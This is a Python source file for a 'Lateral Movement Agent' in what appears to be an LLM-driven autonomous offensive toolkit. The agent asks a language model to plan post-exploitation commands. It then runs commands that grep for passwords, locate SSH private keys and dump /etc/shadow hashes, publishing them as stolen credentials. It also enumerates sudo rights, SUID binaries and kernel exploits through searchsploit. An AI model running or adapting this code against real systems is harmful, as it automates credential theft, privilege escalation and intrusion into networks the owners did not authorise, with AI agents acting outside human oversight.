"""
Lateral Movement Agent - Post-exploitation reconnaissance and pivoting
"""

import os
import sys
import time
import json
import re
from pathlib import Path
from typing import Dict, Any, List, Optional

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from mumei.shared.base_agent import BaseAgent
from mumei.shared.models import Event, EventType, Priority, Host, Credential
from mumei.shared.prompts import get_agent_prompt

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class LateralMovementAgent(BaseAgent):
    """
    Lateral Movement Agent performs post-exploitation activities on compromised hosts.
    Discovers internal networks, harvests credentials, and escalates privileges.
    """

    def __init__(self, agent_id: str):
        """
        Initialize Lateral Movement Agent.

        Args:
            agent_id: Unique agent identifier
        """
        super().__init__(agent_id=agent_id, agent_type="lateral_movement")

        self.system_prompt = get_agent_prompt("lateral_movement")
        self.compromised_hosts: Dict[str, Dict[str, Any]] = {}

        logger.info(f"Lateral Movement Agent {agent_id} initialized")

    def handle_host_compromised(self, event: Event) -> None:
        """
        Handle HostCompromised event and perform post-exploitation.

        Args:
            event: HostCompromised event
        """
        try:
            session_data = event.data

            host_id = session_data.get("host_id")
            session_type = session_data.get("session_type")
            user = session_data.get("user")
            privileges = session_data.get("privileges")

            self.log("INFO", f"Host compromised: {host_id} (User: {user}, Privileges: {privileges})")

            # Store compromised host info
            self.compromised_hosts[host_id] = session_data

            # Use LLM to plan post-exploitation activities
            user_message = f"""
Compromised Host Information:
- Host ID: {host_id}
- Session Type: {session_type}
- User: {user}
- Privileges: {privileges}

Plan post-exploitation activities for this compromised host:
1. Internal network discovery
2. Credential harvesting
3. Privilege escalation (if not root/SYSTEM)
4. Lateral movement opportunities

Provide specific CLI commands to execute on the compromised host.
"""

            response = self.llm.chat(
                system_prompt=self.system_prompt,
                user_message=user_message,
                temperature=0.5,
            )

            self.log("INFO", f"LLM post-exploitation plan: {response[:400]}...")

            # Perform post-exploitation activities
            self.discover_internal_network(host_id, session_data)
            self.harvest_credentials(host_id, session_data)

            if privileges != "root" and privileges != "SYSTEM":
                self.attempt_privilege_escalation(host_id, session_data)

        except Exception as e:
            self.log("ERROR", f"Error handling host compromised: {e}", exc_info=True)

    def discover_internal_network(self, host_id: str, session_data: Dict[str, Any]) -> None:
        """
        Discover internal network from compromised host.

        Args:
            host_id: Compromised host ID
            session_data: Session information
        """
        try:
            self.log("INFO", f"Discovering internal network from {host_id}...")

            # Get network interfaces and routing info
            # Note: In production, these commands would be executed ON the compromised host
            # For now, we simulate the concept

            # Check network interfaces
            ifconfig_result = self.execute_cli("ip addr show", timeout=30)
            if ifconfig_result["success"]:
                self.log("INFO", f"Network interfaces: {ifconfig_result['stdout'][:200]}")
                self.parse_network_interfaces(ifconfig_result["stdout"], host_id)

            # Check routing table
            route_result = self.execute_cli("ip route show", timeout=30)
            if route_result["success"]:
                self.log("INFO", f"Routing table: {route_result['stdout'][:200]}")
                self.parse_routing_table(route_result["stdout"], host_id)

            # Check ARP cache for other hosts
            arp_result = self.execute_cli("ip neigh show", timeout=30)
            if arp_result["success"]:
                self.log("INFO", f"ARP cache: {arp_result['stdout'][:200]}")
                self.parse_arp_cache(arp_result["stdout"], host_id)

            # Perform internal ping sweep (simplified)
            self.log("INFO", "Performing internal network scan...")
            # In production, this would scan discovered internal networks
            internal_networks = ["10.0.0.0/24", "172.16.0.0/24", "192.168.0.0/24"]

            for network in internal_networks:
                self.log("INFO", f"Scanning internal network: {network}")
                # Simplified - in production, use proper network scanning
                # nmap_result = self.execute_cli(f"nmap -sn {network}", timeout=300)

        except Exception as e:
            self.log("ERROR", f"Error discovering internal network: {e}")

    def parse_network_interfaces(self, output: str, source_host_id: str) -> None:
        """Parse network interface output to find internal networks"""
        try:
            # Extract IP addresses and networks
            ip_pattern = r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)'
            matches = re.findall(ip_pattern, output)

            for ip, cidr in matches:
                if not ip.startswith("127."):  # Skip localhost
                    self.log("INFO", f"Found internal IP: {ip}/{cidr}")

                    # Calculate network (simplified)
                    network_parts = ip.split('.')
                    network = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.0/24"

                    self.log("INFO", f"Discovered internal network: {network}")

        except Exception as e:
            self.log("ERROR", f"Error parsing network interfaces: {e}")

    def parse_routing_table(self, output: str, source_host_id: str) -> None:
        """Parse routing table to find internal networks"""
        try:
            # Extract network routes
            lines = output.split('\n')
            for line in lines:
                if '/' in line and not line.startswith('default'):
                    self.log("INFO", f"Found route: {line}")

        except Exception as e:
            self.log("ERROR", f"Error parsing routing table: {e}")

    def parse_arp_cache(self, output: str, source_host_id: str) -> None:
        """Parse ARP cache to discover other hosts"""
        try:
            # Extract IP addresses from ARP cache
            ip_pattern = r'(\d+\.\d+\.\d+\.\d+)'
            ips = re.findall(ip_pattern, output)

            for ip in ips:
                if not ip.startswith("127."):
                    self.log("INFO", f"Discovered host in ARP cache: {ip}")

                    # Publish HostFound event for internal host
                    host = Host(
                        ip_address=ip,
                        status="discovered",
                        metadata={
                            "discovered_from": source_host_id,
                            "discovery_method": "arp_cache",
                        }
                    )

                    self.publish_event(
                        EventType.HOST_FOUND,
                        data=host.model_dump(),
                        priority=Priority.INFO,
                    )

        except Exception as e:
            self.log("ERROR", f"Error parsing ARP cache: {e}")

    def harvest_credentials(self, host_id: str, session_data: Dict[str, Any]) -> None:
        """
        Harvest credentials from compromised host.

        Args:
            host_id: Compromised host ID
            session_data: Session information
        """
        try:
            self.log("INFO", f"Harvesting credentials from {host_id}...")

            privileges = session_data.get("privileges")

            # Search for passwords in files
            self.log("INFO", "Searching for passwords in configuration files...")
            grep_result = self.execute_cli(
                "grep -r 'password' /var/www /home /etc 2>/dev/null | head -20",
                timeout=60
            )

            if grep_result["success"]:
                self.parse_password_grep(grep_result["stdout"], host_id)

            # Search for SSH keys
            self.log("INFO", "Searching for SSH keys...")
            ssh_key_result = self.execute_cli(
                "find /home -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null",
                timeout=60
            )

            if ssh_key_result["success"] and ssh_key_result["stdout"]:
                self.log("INFO", f"Found SSH keys: {ssh_key_result['stdout']}")

            # If root/SYSTEM, dump password hashes
            if privileges in ["root", "SYSTEM", "administrator"]:
                self.log("INFO", "Dumping password hashes (privileged access)...")

                # Linux: /etc/shadow
                shadow_result = self.execute_cli("cat /etc/shadow", timeout=30)
                if shadow_result["success"]:
                    self.parse_shadow_file(shadow_result["stdout"], host_id)

                # Check for database credentials
                self.log("INFO", "Checking for database credentials...")
                db_config_result = self.execute_cli(
                    "find /var/www -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' 2>/dev/null",
                    timeout=60
                )

                if db_config_result["success"] and db_config_result["stdout"]:
                    self.log("INFO", f"Found database config files: {db_config_result['stdout']}")

        except Exception as e:
            self.log("ERROR", f"Error harvesting credentials: {e}")

    def parse_password_grep(self, output: str, source_host_id: str) -> None:
        """Parse grep output for passwords"""
        try:
            lines = output.split('\n')
            for line in lines:
                # Look for common password patterns
                if 'password' in line.lower() and '=' in line:
                    # Extract potential credentials (simplified)
                    match = re.search(r'password["\s]*=[\s"]*([^\s"]+)', line, re.IGNORECASE)
                    if match:
                        password = match.group(1)
                        self.log("INFO", f"Found potential password: {password[:3]}***")

                        # Try to extract username too
                        username_match = re.search(r'user(?:name)?["\s]*=[\s"]*([^\s"]+)', line, re.IGNORECASE)
                        username = username_match.group(1) if username_match else "unknown"

                        # Publish credential
                        credential = Credential(
                            username=username,
                            password=password,
                            source_host_id=source_host_id,
                            metadata={"source": "config_file"}
                        )

                        self.publish_event(
                            EventType.CREDENTIAL_DISCOVERED,
                            data=credential.model_dump(),
                            priority=Priority.WARN,
                        )

        except Exception as e:
            self.log("ERROR", f"Error parsing password grep: {e}")

    def parse_shadow_file(self, output: str, source_host_id: str) -> None:
        """Parse /etc/shadow file for password hashes"""
        try:
            lines = output.split('\n')
            for line in lines:
                if ':' in line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        username = parts[0]
                        password_hash = parts[1]

                        if password_hash and password_hash not in ['*', '!', '!!']:
                            self.log("INFO", f"Found password hash for user: {username}")

                            # Determine hash type
                            hash_type = "unknown"
                            if password_hash.startswith("$6$"):
                                hash_type = "SHA-512"
                            elif password_hash.startswith("$5$"):
                                hash_type = "SHA-256"
                            elif password_hash.startswith("$1$"):
                                hash_type = "MD5"

                            # Publish credential
                            credential = Credential(
                                username=username,
                                hash=password_hash,
                                hash_type=hash_type,
                                source_host_id=source_host_id,
                                metadata={"source": "/etc/shadow"}
                            )

                            self.publish_event(
                                EventType.CREDENTIAL_DISCOVERED,
                                data=credential.model_dump(),
                                priority=Priority.WARN,
                            )

        except Exception as e:
            self.log("ERROR", f"Error parsing shadow file: {e}")

    def attempt_privilege_escalation(self, host_id: str, session_data: Dict[str, Any]) -> None:
        """
        Attempt privilege escalation on compromised host.

        Args:
            host_id: Compromised host ID
            session_data: Session information
        """
        try:
            self.log("INFO", f"Attempting privilege escalation on {host_id}...")

            # Check sudo permissions
            sudo_result = self.execute_cli("sudo -l", timeout=30)
            if sudo_result["success"]:
                self.log("INFO", f"Sudo permissions: {sudo_result['stdout'][:200]}")

                if "NOPASSWD" in sudo_result["stdout"]:
                    self.log("INFO", "Found NOPASSWD sudo entry - potential privilege escalation!")

            # Check for SUID binaries
            suid_result = self.execute_cli(
                "find / -perm -4000 -type f 2>/dev/null",
                timeout=120
            )

            if suid_result["success"]:
                self.log("INFO", f"SUID binaries: {suid_result['stdout'][:200]}")

            # Check kernel version for exploits
            kernel_result = self.execute_cli("uname -a", timeout=10)
            if kernel_result["success"]:
                self.log("INFO", f"Kernel version: {kernel_result['stdout']}")

                # Search for kernel exploits
                searchsploit_result = self.execute_cli(
                    f"searchsploit linux kernel {kernel_result['stdout']}",
                    timeout=30
                )

                if searchsploit_result["success"]:
                    self.log("INFO", f"Potential kernel exploits: {searchsploit_result['stdout'][:200]}")

        except Exception as e:
            self.log("ERROR", f"Error attempting privilege escalation: {e}")

    def run(self) -> None:
        """Main agent loop"""
        self.running = True
        self.log("INFO", "Lateral Movement Agent starting...")

        try:
            # Subscribe to HostCompromised events
            self.subscribe_to_events([EventType.HOST_COMPROMISED], self.handle_host_compromised)

            # Main loop - send heartbeats
            while self.running:
                self.send_heartbeat()
                time.sleep(30)

        except KeyboardInterrupt:
            self.log("INFO", "Received interrupt signal")
        except Exception as e:
            self.log("ERROR", f"Error in main loop: {e}", exc_info=True)
        finally:
            self.shutdown()


def main():
    """Main entry point"""
    agent_id = os.getenv("AGENT_ID", "lateral_movement_01")

    agent = LateralMovementAgent(agent_id=agent_id)
    agent.run()


if __name__ == "__main__":
    main()
